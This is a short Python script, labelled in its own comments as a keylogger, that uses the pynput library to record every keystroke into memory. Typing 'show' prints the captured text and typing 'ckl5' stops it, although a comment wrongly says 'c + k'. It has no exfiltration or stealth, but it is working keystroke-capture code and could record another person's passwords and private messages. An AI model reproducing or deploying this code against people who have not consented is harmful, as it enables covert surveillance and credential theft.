from pynput import keyboard
import time
from multiprocessing import Process
from print_text import *
from time_stamp import *


input_keys = []
memory = {}

def on_press(key):
    try:
        input_keys.append(chr(ord(key.char)))
    except:
        if str(key) == 'Key.space':
            input_keys.append(' ')
        elif str(key) == 'Key.enter':
            input_keys.append('\n')
        else:
            pass

###     stop monitoring or show memory     ###
def on_release(key):
    try:
        show = input_keys[-4:] == ['s','h','o','w']
        stop = input_keys[-4:] == ['c','k','l','5']
        if show:
        ###     enter 'show' to view the last memory keys       ###
            for i in range(4):
                input_keys.pop()
            output_text = "".join(input_keys)
            print_text(output_text)
        ###     press "c + k" to stop monitoring       ###
        elif stop:
            for i in range(4):
                input_keys.pop()
            print_text('monitoring is stoped !')
            return False
        else:
            pass
    except:
        pass

###     keyboard listener      ###
def run_listener():
    listener = keyboard.Listener(on_press=on_press,on_release=on_release)
    listener.start()
    listener.join()

### run KeyLogger       ###
if __name__ == '__main__':
    run_listener()